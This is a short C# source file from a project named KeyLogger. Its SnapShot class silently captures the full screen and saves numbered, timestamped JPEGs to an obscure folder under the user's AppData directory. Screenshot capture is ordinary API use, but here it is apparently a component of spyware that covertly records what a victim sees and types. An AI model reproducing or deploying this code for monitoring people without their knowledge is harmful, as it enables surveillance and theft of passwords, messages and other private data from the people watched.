using System;

namespace KeyLogger
{
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Windows.Forms;

    class SnapShot
    {
        private int imageID;
        public void TakeWindowSnap()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                string imagePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                imagePath += @"\TKH\QS\";

                if (!Directory.Exists(imagePath))
                    Directory.CreateDirectory(imagePath);

                imagePath += "qs" + imageID.ToString() + " " + DateTime.Now.ToString("d MMMM HH-mm-ss") + ".jpg";
                bitmap.Save(imagePath, ImageFormat.Jpeg);
                imageID++;
            }
        }
    }
}
